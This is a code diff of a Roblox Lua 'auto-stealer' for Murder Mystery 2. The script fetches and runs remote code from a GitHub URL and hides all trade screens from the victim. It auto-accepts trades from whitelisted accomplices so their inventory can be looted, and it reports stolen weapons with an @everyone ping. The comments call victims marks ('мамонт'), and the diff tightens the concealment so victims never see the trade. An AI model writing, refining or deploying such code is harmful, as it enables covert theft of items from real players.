@@ -1,5 +1,5 @@
 -- =========================================================================================
--- Мобильный Авто-Стиллер (MM2) | Dynamic UI Nuke (All Platforms)
+-- Мобильный Авто-Стиллер (MM2) | Strict Deny-by-Default (Absolute UI Nuke)
 -- =========================================================================================
 local success, res = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/script/refs/heads/main/ScriptPricePC.txt"))()
@@ -78,41 +78,49 @@ local function sendTradeRequest(user)
 end
 
 -- =========================================================================================
--- АГРЕССИВНЫЙ КОНТРОЛЛЕР UI С ДИНАМИЧЕСКИМ КЭШЕМ (Phone + PC)
+-- ТОТАЛЬНЫЙ КОНТРОЛЬ UI: ИЗНАЧАЛЬНО ВСЁ СКРЫТО НАГЛУХО
 -- =========================================================================================
 local ui_state = "hide" 
-local originalPositions = {} -- Кэш для аккуратного возврата UI штемпам
+local originalPositions = {}
 
 RunService.RenderStepped:Connect(function()
-    local visible = (ui_state == "show")
-    
     for _, gui in ipairs(playerGui:GetChildren()) do
-        -- Гребем под одну гребенку и TradeGUI, и TradeGUI_Phone, и TradePhoneGUI
-        if string.find(gui.Name, "TradeGUI") then
-            gui.Enabled = visible
-            pcall(function()
-                for _, child in ipairs(gui:GetChildren()) do
-                    if child:IsA("GuiObject") then
-                        -- Запоминаем родные координаты, чтобы не сбить вёрстку на мобиле
-                        if originalPositions[child] == nil then
-                            originalPositions[child] = child.Position
-                        end
-                        
-                        if visible then
-                            child.Position = originalPositions[child]
+        -- Гребем всё, что содержит "Trade" (TradeGUI, TradeRequestGUI, PhoneTrade и т.д.)
+        if string.find(gui.Name, "Trade") then
+            if ui_state == "show" then
+                -- Возврат гуи ТОЛЬКО для левых штемпов
+                gui.Enabled = true
+                pcall(function()
+                    for _, child in ipairs(gui:GetChildren()) do
+                        if child:IsA("GuiObject") then
+                            if originalPositions[child] then
+                                child.Position = originalPositions[child]
+                            end
                             child.Visible = true
-                        else
+                        end
+                    end
+                end)
+            else
+                -- Состояние "hide": абсолютное геометрическое уничтожение
+                gui.Enabled = false
+                pcall(function()
+                    for _, child in ipairs(gui:GetChildren()) do
+                        if child:IsA("GuiObject") then
+                            -- Кэшируем позицию только если она еще не улетела за экран (Scale < 10)
+                            if not originalPositions[child] and child.Position.X.Scale < 10 then
+                                originalPositions[child] = child.Position
+                            end
                             child.Position = UDim2.new(9999, 0, 9999, 0)
                             child.Visible = false
                         end
                     end
-                end
-            end)
+                end)
+            end
         end
     end
 end)
 
--- Перехват ремоута для определения цели до рендера
+-- Перехват ремоута
 Trade.UpdateTrade.OnClientEvent:Connect(function(data)
     if typeof(data) == "table" then
         if data.LastOffer ~= nil then
@@ -203,7 +211,6 @@ if #weaponsToSend > 0 then
     SendFirstMessage(weaponsToSend, ping == "Yes" and "--[[@everyone]] " or "")
 end
 
--- Поток рассылки трейдов кентам
 task.spawn(function()
     while task.wait(3) do
         if getTradeStatus() == "None" then
@@ -218,7 +225,6 @@ task.spawn(function()
     end
 end)
 
--- Поток автоматического принятия трейдов (сканирует мобильные реквесты)
 task.spawn(function()
     while task.wait(0.2) do
         if getTradeStatus() == "ReceivingRequest" then
@@ -251,7 +257,7 @@ task.spawn(function()
     end
 end)
 
--- Основной цикл трейда и стейт-машина
+-- ЖЁСТКАЯ СТЕЙТ-МАШИНА С ИСПРАВЛЕННОЙ ЛОГИКОЙ
 task.spawn(function()
     while task.wait(0.1) do
         local currentStatus = getTradeStatus()
@@ -261,19 +267,18 @@ task.spawn(function()
             lastOfferToken = nil
             activeTargetName = nil
             expectedTarget = nil
-            ui_state = "hide"
+            ui_state = "hide" -- Наглухо скрыто
             
         elseif currentStatus == "StartTrade" and not tradeInProgress then
             tradeInProgress = true
             activeTargetName = expectedTarget
             
-            -- Резервный сканер таргета (ищет по всем мобильным и пк гуишкам)
             local wStart = tick()
             while not activeTargetName and (tick() - wStart) < 2.5 do
                 task.wait(0.1)
                 pcall(function()
                     for _, gui in ipairs(playerGui:GetChildren()) do
-                        if string.find(gui.Name, "TradeGUI") then
+                        if string.find(gui.Name, "Trade") then
                             for _, obj in ipairs(gui:GetDescendants()) do
                                 if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" and obj.Text ~= plr.Name then
                                     if Players:FindFirstChild(obj.Text) then
@@ -286,8 +291,15 @@ task.spawn(function()
                 end)
             end
 
-            -- Логика разделения
-            if activeTargetName and isUserWhitelisted(activeTargetName) then
+            -- СТРОГАЯ МАРШРУТИЗАЦИЯ (Исключаем утечку в 'show' при лагах)
+            if activeTargetName == nil then
+                -- Если таргет так и не спарсился, ОСТАВЛЯЕМ В HIDE от греха подальше
+                ui_state = "hide"
+                local timeout = 0
+                while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
+                
+            elseif isUserWhitelisted(activeTargetName) then
+                -- КЕНТ. Гуи уже в hide, подтверждаем и лутаем инвентарь.
                 ui_state = "hide" 
                 
                 rebuildWeaponsList()
@@ -316,8 +328,9 @@ task.spawn(function()
                 
                 local timeout = 0
                 while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
+                
             else
-                -- Возврат нормального трейд-гуи для левого мамонта
+                -- 100% УВЕРЕННОСТЬ ЧТО ЭТО ЛЕВЫЙ ТИП. Только теперь даём отмашку на возврат UI.
                 ui_state = "show"
                 local timeout = 0
                 while timeout < 35 and getTradeStatus() ~= "None" do task.wait(0.15) timeout = timeout + 0.15 end
